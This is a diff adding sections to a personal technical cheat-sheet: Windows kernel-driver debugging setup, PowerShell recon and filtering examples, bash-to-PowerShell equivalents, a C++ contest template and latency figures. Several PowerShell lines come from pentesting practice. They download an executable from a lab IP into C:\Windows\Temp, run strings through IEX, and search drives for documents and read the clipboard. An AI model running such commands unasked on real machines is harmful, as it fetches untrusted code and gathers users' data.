@@ -1251,6 +1251,62 @@ $ lspci - PCI device discovery
 
 
 
+Windows Kernel
+==============
+https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/attaching-to-a-virtual-machine--kernel-mode-
+https://github.com/repnz/windbg-cheat-sheet
+https://reverseengineering.stackexchange.com/questions/16685/how-can-i-receive-dbgprint-messages-in-windbg-on-windows-10
+https://blahcat.github.io/2017/08/07/setting-up-a-windows-vm-lab-for-kernel-debugging/
+https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/compiling-first-kernel-driver-kdprint-dbgprint-and-debugview
+https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/loading-a-windows-kernel-driver-osr-driver-loader-debugging-with-source-code
+https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals
+
+Kernel debugging!!! Very good link, use this:
+https://github.com/repnz/windbg-cheat-sheet
+
+```
+bcdedit /set testsigning on
+#bcdedit -set nointegritychecks ON
+bcdedit /debug on
+bcdedit /dbgsettings serial debugport:1 baudrate:115200
+
+Type to check if debug is on: 
+bcdedit /enum
+
+Type the below path to pipe to VirtuaBox Serial Port COM1/Host Pipe
+\\.\pipe\myvbox
+Uncheck Connect to existing pipe/socket
+Start first WinDbg with Admin and Kernel Debug...->COM->Port:
+\\.\pipe\myvbox
+Also check Pipe and Reconnect
+In WinDbg to get all the DbgPrint() messages type:
+ed nt!Kd_Default_Mask 0xf
+```
+
+Set
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter
+to DWORD
+Path	HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter
+Name	DEFAULT
+Type	REG_DWORD
+Value	0xF
+
+# Register driver
+right click 'Install' on nullFilter.inf
+sc.exe start nullFilter
+
+# filter will be the name - register
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create
+sc create filter type= filesys start= demand binpath= C:\Users\bodge\Desktop\nullFilter.sys
+sc.exe start filter
+sc.exe stop filter
+sc.exe delete filter
+
+WinDbg (windbg)
+---------------
+dd [location/variable] - dissassembly data at variable
+
+
 Powershell
 ==========
 
@@ -1269,5 +1325,195 @@ https://docs.microsoft.com/en-us/learn/modules/introduction-to-powershell/4-cmdl
 
 
 
+=======
+https://resources.infosecinstitute.com/topic/powershell-for-pentesters-part-1-introduction-to-powershell-and-cmdlets/
+
+Examples
+--------
+```bash
+Try fuzzy find some command:
+get-help *alia*
+Get-Command *alia*
+
+Basic OS recon: (use Get-WmiObject)
+Link: https://adamtheautomator.com/get-wmiobject/
+
+Get-WmiObject -Class win32_OperatingSystem | select *
+Get-WmiObject -Class win32_process | select *
+Get-WmiObject -Class win32_service | select *
+Get-WmiObject -Class win32_bios | select *
 
 
+get-help get-service -examples
+Get-Service | Where-Object {$_.Status -eq "Running"}
+ls | Get-Member -MemberType * | Select-Object MemberType
+Print processes - name and id
+foreach($proc in Get-Process) { $name = $proc.ProcessName; $id = $proc.Id; echo "$name $id" }
+Display each process's name
+Get-Process | ForEach-Object ProcessName
+
+Invoke-Expression - runs command from string:
+Invoke-Expression "echo HI"
+IEX "echo HI"
+echo 'iex "echo HI"' | powershell -noprofile -
+
+Filtering result:
+https://www.concurrency.com/blog/august-2018/powershell-basics-filtering-and-selecting
+Get-Process | Where-Object {$_.WorkingSet -gt 100000000}
+Get-Command *schedule* | ? {$_.Name -like "Get*"}
+Get-ChildItem | Select-Object -First 5
+Get-Process | Select-Object -Property Name, Id
+
+Find out all the property list for object:
+Get-Service | Format-List *
+
+Get the threads of a given process
+(Get-Process -Name vim).Threads
+(Get-Process -Name vim).Threads | ForEach-Object { $_.ThreadState }
+foreach($proc in (Get-Process -Name "chrome")) { $id=$proc.Id; echo "#### $id ######"; $proc.Threads|ForEach-Object Id }
+Finding certain files: 
+Get-ChildItem -Path C:\ -Include *.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
+Get-ChildItem -Path C:\ -Filter *.doc -File -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -ge $FindDate }
+
+% means Foreach-Object:
+Get-ChildItem | % { echo $_.name }
+
+Write many variables:
+Get-ChildItem | % { Write-Host $_.Length $_.Name -Separator "`t" }
+
+Where-Object: to filter out the objects coming from the pipeline ( ? is the alias)
+get-ChildItem| ? {$_.length –gt 10000000 | % {write-host $_.length $_.name -separator "`t`t"}
+
+Filtering(?) and Foreach-ing(%):
+Get-ChildItem | ? { $_.Length -le 18 } | % { write-host $_.Length $_.Name -Separator "`t`t" }
+
+Show all the members of the object
+Get-ChildItem .\MsMpEng.exe | Select-Object *
+
+Use a hashmap to count number of distinct verb commands we have
+$counts=@{}; foreach($verb in (Get-Command | % Verb)) { $counts[$verb]+=1 }; $counts.GetEnumerator() | Sort-Object -Property Value -Descending
+
+Downloading from web:
+(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+$res = (New-Object Net.WebClient).DownloadString("https://index.hu")
+Invoke-WebRequest "https://index.hu/" -OutFile .\Downloads\index.html
+
+List admin accounts:
+Get-LocalGroupMember Administrators
+
+Clipboard access:
+Get-Clipboard
+
+Processes:
+Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+
+Services:
+Get-Service
+Get-Service | ? Status -like Running
+
+Network interfaces:
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+Get-DnsClientServerAddress -AddressFamily IPv4 | ft
+
+
+```
+
+
+Bash -> Powershell
+==================
+
+```bash
+
+echo:
+write-output
+write-host
+
+find . -name "poti*" -type f
+Get-ChildItem -Path . -Filter "poti*" -Recurse -File 
+
+which
+function which($name)                                            
+{                                                                
+    Get-Command $name | Select-Object -ExpandProperty Definition 
+}                                                                
+
+rm -rf <folder>
+Remove-Item –path <folder> –recurse
+
+unalias <aliasname>
+Remove-Item Alias:<aliasname>
+Remove-Item Function:<functionname>
+
+cd $TMP
+cd $env:TMP
+
+```
+
+Competitive programming (c++, competitive)
+==========================================
+
+```cpp
+#include "bits/stdc++.h"
+using namespace std;
+#define max(a, b) (a < b ? b : a)
+#define min(a, b) ((a > b) ? b : a)
+#define mod 1e9 + 7
+#define FOR(a, c) for (int(a) = 0; (a) < (c); (a)++)
+#define FORL(a, b, c) for (int(a) = (b); (a) <= (c); (a)++)
+#define FORR(a, b, c) for (int(a) = (b); (a) >= (c); (a)--)
+#define INF 1000000000000000003
+typedef long long int ll;
+typedef vector<int> vi;
+typedef pair<int, int> pi;
+#define F first
+#define S second
+#define PB push_back
+#define POB pop_back
+#define MP make_pair
+int main()
+{
+    ios::sync_with_stdio(0);
+    cin.tie(0);
+    int T;
+    cin >> T;
+    while (T--) {
+        int N;
+        cin >> N;
+        ll a[N];
+        FOR(i, N)
+        cin >> a[i];
+    }
+    return 0;
+}
+```
+
+Latency, latency
+================
+
+Latency Comparison Numbers
+--------------------------
+L1 cache reference                           0.5 ns
+Branch mispredict                            5   ns
+L2 cache reference                           7   ns                      14x L1 cache
+Mutex lock/unlock                           25   ns
+Main memory reference                      100   ns                      20x L2 cache, 200x L1 cache
+Compress 1K bytes with Zippy            10,000   ns       10 us
+Send 1 KB bytes over 1 Gbps network     10,000   ns       10 us
+Read 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB/sec SSD
+Read 1 MB sequentially from memory     250,000   ns      250 us
+Round trip within same datacenter      500,000   ns      500 us
+Read 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memory
+HDD seek                            10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip
+Read 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD
+Read 1 MB sequentially from HDD     30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD
+Send packet CA->Netherlands->CA    150,000,000   ns  150,000 us  150 ms
+
+Notes
+-----
+1 ns = 10^-9 seconds
+1 us = 10^-6 seconds = 1,000 ns
+1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns
+
+Visualization of latency numbers
+--------------------------------
+https://gist.github.com/hellerbarde/2843375
